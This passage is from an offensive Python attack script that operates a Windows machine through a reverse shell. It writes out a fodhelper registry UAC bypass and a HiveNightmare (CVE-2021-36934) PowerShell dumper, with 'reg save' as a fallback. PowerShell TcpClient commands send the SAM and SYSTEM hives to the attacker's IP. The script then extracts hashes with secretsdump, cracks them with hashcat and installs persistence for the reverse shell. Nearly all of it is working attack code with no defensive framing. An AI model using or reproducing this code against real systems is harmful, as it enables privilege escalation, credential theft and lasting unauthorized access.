            r'New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force',
            r'Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "{}\{}" -Force'.format(
                curr_dir, executable_privilege_reverse
            ),
        ]
        
        # Trigger command for FodHelper
        trigger_cmd = r'Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden'
        cleanup_cmd = r'Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force'
    
    # Apply the selected UAC bypass registry modifications
    for payload in uac_bypass_payloads:
        send_payload(conn_normal_priv, payload)
    
    # --- Stage 3: Trigger UAC bypass and wait for elevated connection ---
    print("\n[+] Stage 3: Triggering UAC bypass to get elevated privileges...")
    s_high_priv = create_listener(port=4444)
    
    # Trigger the UAC bypass and then clean up
    trigger_payloads = [
        trigger_cmd,
        cleanup_cmd,
    ]
    
    for payload in trigger_payloads:
        if payload:  # Only send non-empty payloads
            send_payload(conn_normal_priv, payload)
    
    print("[+] Waiting for elevated connection on port 4444...")
    conn_high_priv, addr_high_priv = s_high_priv.accept()
    print(f"[+] Elevated connection received from {addr_high_priv}")
    
    # --- Stage 4: Choose registry hive extraction method ---
    print("\n[+] Stage 4: Choose registry hive extraction method:")
    print("  [1] Standard reg save command")
    print("  [2] CVE-2021-36934 (HiveNightmare)")
    
    extraction_choice = input("[?] Enter choice (1 or 2): ")
    
    if extraction_choice == "2":
        # --- Use HiveNightmare exploit with elevated privileges ---
        print("\n[+] Using CVE-2021-36934 (HiveNightmare) to extract registry hives...")
        
        # Get username for default path
        username = send_payload(conn_high_priv, payload="echo $env:USERNAME", verbose=False).strip()
        
        # Create PowerShell script for HiveNightmare
        hivenightmare_script = '''
        [CmdletBinding()]
        param(
            $path = "C:\\Users\\$env:USERNAME\\Desktop"
        )
        
        $outSam = "$path\\Sam.hive"
        $outSoft = "$path\\Soft.hive"
        $outSys = "$path\\Sys.hive"
        
        if(-not(test-path $path)){
            new-item $path -ItemType Directory | out-null
        }
        
        if(([environment]::OSVersion.Version).build -lt 17763){
            Write-Host "[-] System not susceptible to CVE-2021-36934"
            return $false
        }
        else{
            Write-Host "[+] System is a vulnerable version of Windows"
        }
        
        $success = $false
        
        for($i = 1; $i -le 9; $i++){
            try{
                [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\sam"), ($outSam + $i))
                Write-Host "[+] Dumping SAM$i hive..."
                $success = $true
            } catch{}
            
            try{
                [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\software"), ($outSoft + $i))
                Write-Host "[+] Dumping SOFTWARE$i hive..."
            } catch{}
            
            try{
                [System.IO.File]::Copy(("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" + $i + "\\Windows\\System32\\config\\system"), ($outSys + $i))
                Write-Host "[+] Dumping SYSTEM$i hive..."
                $success = $true
            } catch{}
        }
        
        if(test-path $path\\s*.hive*){
            Write-Host "[+] Hives are dumped to $path"
            return $true
        }
        else{
            Write-Host "[-] There are no Volume Shadow Copies on this system"
            return $false
        }
        '''
        
        # Save the script to a file on the target
        script_path = f"C:\\Users\\{username}\\hivenightmare.ps1"
        script_payload = f"$script = @'\n{hivenightmare_script}\n'@\nSet-Content -Path '{script_path}' -Value $script"
        send_payload(conn_high_priv, script_payload, verbose=False)
        
        # Execute the script
        execute_payload = f"powershell -ExecutionPolicy Bypass -File {script_path}"
        result = send_payload(conn_high_priv, execute_payload)
        
        # Check if the exploit was successful
        if "[+] Hives are dumped to" in result:
            print("[+] HiveNightmare exploit successful!")
            
            # Get path to the dumped files
            desktop_path = f"C:\\Users\\{username}\\Desktop"
            
            # Find SAM and SYSTEM files
            sam_files = send_payload(conn_high_priv, f"Get-ChildItem {desktop_path} -Filter Sam.hive* | Select-Object -ExpandProperty FullName", verbose=False)
            sys_files = send_payload(conn_high_priv, f"Get-ChildItem {desktop_path} -Filter Sys.hive* | Select-Object -ExpandProperty FullName", verbose=False)
            
            sam_file_list = [f for f in sam_files.strip().split('\n') if f.strip()]
            sys_file_list = [f for f in sys_files.strip().split('\n') if f.strip()]
            
            if sam_file_list and sys_file_list:
                sam_file = sam_file_list[0]
                system_file = sys_file_list[0]
                
                print(f"[+] SAM hive found: {sam_file}")
                print(f"[+] SYSTEM hive found: {system_file}")
                
                # Prepare transfer commands for extracted hives
                elevated_dir = get_curr_dir(conn_high_priv)
                sam_transfer_cmd = f'''
                $filePath = "{sam_file}"
                $bytes = [System.IO.File]::ReadAllBytes($filePath)
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.Connect("{local_ip}", 8000)
                $stream = $tcpClient.GetStream()
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Close()
                $tcpClient.Close()
                '''
                
                sys_transfer_cmd = f'''
                $filePath = "{system_file}"
                $bytes = [System.IO.File]::ReadAllBytes($filePath)
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.Connect("{local_ip}", 8000)
                $stream = $tcpClient.GetStream()
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Close()
                $tcpClient.Close()
                '''
            else:
                print("[!] HiveNightmare exploit failed to retrieve hives. Falling back to standard reg save.")
                extraction_choice = "1"  # Fall back to standard method
        else:
            print("[!] HiveNightmare exploit failed. Falling back to standard reg save.")
            extraction_choice = "1"  # Fall back to standard method
    
    if extraction_choice == "1":
        # Standard registry extraction method
        print("\n[+] Using standard reg save command to extract registry hives...")
        dump_payloads = [
            r'reg save HKLM\SAM sam.dump /y',
            r'reg save HKLM\System sys.dump /y',
        ]
        
        for payload in dump_payloads:
            send_payload(conn_high_priv, payload)
        
        # Prepare transfer commands for standard reg save files
        elevated_dir = get_curr_dir(conn_high_priv)
        sam_transfer_cmd = r'$filePath = "{}\sam.dump";$bytes = [System.IO.File]::ReadAllBytes($filePath);$tcpClient = New-Object System.Net.Sockets.TcpClient;$tcpClient.Connect("{}", 8000);$stream = $tcpClient.GetStream();$stream.Write($bytes, 0, $bytes.Length);$stream.Close();$tcpClient.Close()'.format(
            elevated_dir, local_ip
        )
        sys_transfer_cmd = r'$filePath = "{}\sys.dump";$bytes = [System.IO.File]::ReadAllBytes($filePath);$tcpClient = New-Object System.Net.Sockets.TcpClient;$tcpClient.Connect("{}", 8000);$stream = $tcpClient.GetStream();$stream.Write($bytes, 0, $bytes.Length);$stream.Close();$tcpClient.Close()'.format(
            elevated_dir, local_ip
        )
    
    # Transfer files
    print("[+] Transferring SAM hive...")
    socket_write_file(conn=conn_high_priv, port=8000, filename="sam.dump", payload=sam_transfer_cmd)
    
    print("[+] Transferring SYSTEM hive...")
    socket_write_file(conn=conn_high_priv, port=8000, filename="sys.dump", payload=sys_transfer_cmd)
    
    # --- Stage 6: Extract password hashes ---
    print("\n[+] Stage 6: Extracting password hashes...")
    process = subprocess.Popen(
        ["secretsdump.py", "LOCAL", "-sam", "sam.dump", "-system", "sys.dump"], 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )
    stdout, stderr = process.communicate()
    
    # Save output to file
    with open("windows_hashes.txt", 'w') as f:
        f.write(stdout)
    
    print(stdout)
    
    # Extract user accounts and hashes from the output
    users = extract_hashes_from_dump(stdout)
    
    # --- Stage 7: Prepare and run hashcat password cracking ---
    print("\n[+] Stage 7: Preparing for hashcat password cracking")
    
    if len(users) > 0:
        print(f"[+] Found {len(users)} user accounts with hashes")
        
        # Prepare hashcat input file
        hash_file = prepare_hashcat_file(users)
        
        # Ask for hashcat options
        print("\n[+] Hashcat Attack Options:")
        print("  [1] Dictionary Attack (with rockyou.txt)")
        print("  [2] Dictionary Attack with Rules (best64)")
        print("  [3] Brute Force (up to 8 characters)")
        print("  [4] Mask Attack (custom pattern)")
        
        attack_choice = input("[?] Select attack method (1-4): ")
        
        if attack_choice == "2":
            # Dictionary with rules
            run_hashcat_attack(hash_file, rule="best64")
        elif attack_choice == "3":
            # Brute force attack (attack mode 3)
            run_hashcat_attack(hash_file, attack_mode=3, wordlist="?a?a?a?a?a?a?a?a")
        elif attack_choice == "4":
            # Mask attack
            mask = input("[?] Enter mask pattern (e.g., ?u?l?l?l?l?d?d): ")
            run_hashcat_attack(hash_file, attack_mode=3, wordlist=mask)
        else:
            # Default to dictionary attack
            wordlist = input("[?] Enter path to wordlist (default: rockyou.txt): ")
            if not wordlist:
                wordlist = "/usr/share/wordlists/rockyou.txt"
            run_hashcat_attack(hash_file, wordlist=wordlist)
    else:
        print("[!] No user accounts found in the hash dump.")
    
    # --- Stage 8: Clean up ---
    print("\n[+] Stage 8: Cleaning up...")

    # --- Stage 9: Add persistence ---
    print("\n[+] Stage 9: Adding persistence for the reverse shell...")
    print("  [1] Registry Run key (common, easy to detect)")
    print("  [2] Scheduled Task (moderate stealth)")
    print("  [3] Windows Service (requires high privileges)")
    print("  [4] WMI Event Subscription (stealthy, complex)")
    print("  [5] Startup Folder (common, easy to detect)")

    persistence_choice = input("[?] Select persistence method (1-5): ")

    # Get path to the reverse shell
    rev_exe_path = f"{get_curr_dir(conn_normal_priv)}\\{executable_privilege_reverse}"

    if persistence_choice == "2":
        add_persistence(conn_high_priv, rev_exe_path, "scheduled_task")
    elif persistence_choice == "3":
        add_persistence(conn_high_priv, rev_exe_path, "service")
    elif persistence_choice == "4":
        add_persistence(conn_high_priv, rev_exe_path, "wmi")
    elif persistence_choice == "5":
        add_persistence(conn_high_priv, rev_exe_path, "startup_folder")
    else:
        # Default to registry method
        add_persistence(conn_high_priv, rev_exe_path, "registry")
    
    # Close high_priv connections
    conn_normal_priv.close()
    s_normal_priv.close()
    conn_high_priv.close()
    s_high_priv.close()
    
    print("\n[+] Operation completed successfully!")
    print("[+] Password hashes have been extracted to windows_hashes.txt")
    print("[+] Any cracked passwords have been saved to cracked_passwords.txt")

if __name__ == "__main__":
    main()